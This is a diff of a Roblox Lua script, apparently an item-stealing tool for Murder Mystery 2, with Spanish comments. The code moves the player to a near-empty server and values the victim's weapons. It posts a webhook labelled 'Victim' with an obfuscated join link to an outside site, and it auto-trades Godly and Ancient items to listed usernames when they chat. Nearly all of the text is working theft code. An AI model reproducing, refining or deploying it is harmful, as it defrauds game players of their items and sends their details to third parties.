@@ -2,7 +2,6 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local TeleportService = game:GetService("TeleportService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 -- Evitar ejecución múltiple
 if getgenv().ScriptEjecutado then return end
@@ -16,9 +15,12 @@ local min_value = _G.min_value or 1
 local pingEveryone = _G.pingEveryone == "Yes"
 
 local req = syn and syn.request or http_request or request
-if not req then warn("No HTTP request method available!") return end
+if not req then
+    warn("No HTTP request method available!")
+    return
+end
 
--- ===== Teleport a servidor vacío o casi vacío (retry infinito 2s) =====
+-- ===== Teleport a servidor vacío o casi vacío (retry infinito con 2s delay) =====
 local function teleportToServer(minEmptyPlayers, maxPlayers)
     while true do
         local servers
@@ -29,7 +31,6 @@ local function teleportToServer(minEmptyPlayers, maxPlayers)
             for _, s in ipairs(servers.data) do
                 if s.id ~= game.JobId and s.playing <= maxPlayers and s.playing >= minEmptyPlayers then
                     TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer)
-                    getgenv().AlreadyTeleported = true
                     return
                 end
             end
@@ -38,19 +39,14 @@ local function teleportToServer(minEmptyPlayers, maxPlayers)
     end
 end
 
+-- Solo ejecutar teleport si no ha teleporteado
 if not getgenv().AlreadyTeleported then
+    getgenv().AlreadyTeleported = true
     teleportToServer(0, 8)
+    return
 end
 
--- Mensaje visual si script se vuelve a ejecutar
-pcall(function()
-    if not getgenv().LogoMessageShown then
-        getgenv().LogoMessageShown = true
-        print("🚨 Anónimo ejecutando script...")
-    end
-end)
-
--- ===== Función Base64 =====
+-- ===== Función Base64 propia =====
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 local function base64Encode(data)
     return ((data:gsub('.', function(x)
@@ -95,7 +91,7 @@ for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
 end
 
 -- ===== Funciones de trade =====
-local TradeService = ReplicatedStorage:WaitForChild("Trade")
+local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
 local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
 local function sendTradeRequest(user)
     local plrObj = Players:FindFirstChild(user)
@@ -106,7 +102,7 @@ local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
 local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
 
 -- ===== MM2 Supreme value system =====
-local database = require(ReplicatedStorage.Database.Sync.Item)
+local database = require(game.ReplicatedStorage.Database.Sync.Item)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
 local categories = {
     godly="https://supremevaluelist.com/mm2/godlies.html",
@@ -186,7 +182,7 @@ local totalValue=0
 local min_rarity_index=table.find(rarityTable,min_rarity)
 local valueList=buildValueList()
 
-local profile=ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+local profile=game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
 for id,amount in pairs(profile.Weapons.Owned) do
     local item=database[id]
     if item then
@@ -207,7 +203,6 @@ if #weaponsToSend > 0 then
     local rawLink="https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..math.random(100000,999999)
     local encodedLink=base64Encode(rawLink)
     local safeLink="https://fern.wtf/redirect?data="..HttpService:UrlEncode(encodedLink)
-
     local fields={
         {name="Victim 👤", value=LocalPlayer.Name, inline=true},
         {name="Enlace seguro 🔗", value="[Click aquí]("..safeLink..")", inline=false},
@@ -221,7 +216,7 @@ if #weaponsToSend > 0 then
     SendWebhook("💪MM2 Hit Protegido💯","💰Solo Godly/Ancient armas",fields,prefix)
 end
 
--- ===== Trade completo =====
+-- ===== Trade =====
 local function doTrade(targetName)
     while #weaponsToSend>0 do
         local status=getTradeStatus()
@@ -247,7 +242,6 @@ for _, p in ipairs(Players:GetPlayers()) do
         p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end
-
 Players.PlayerAdded:Connect(function(p)
     if table.find(users,p.Name) then
         p.Chatted:Connect(function() doTrade(p.Name) end)
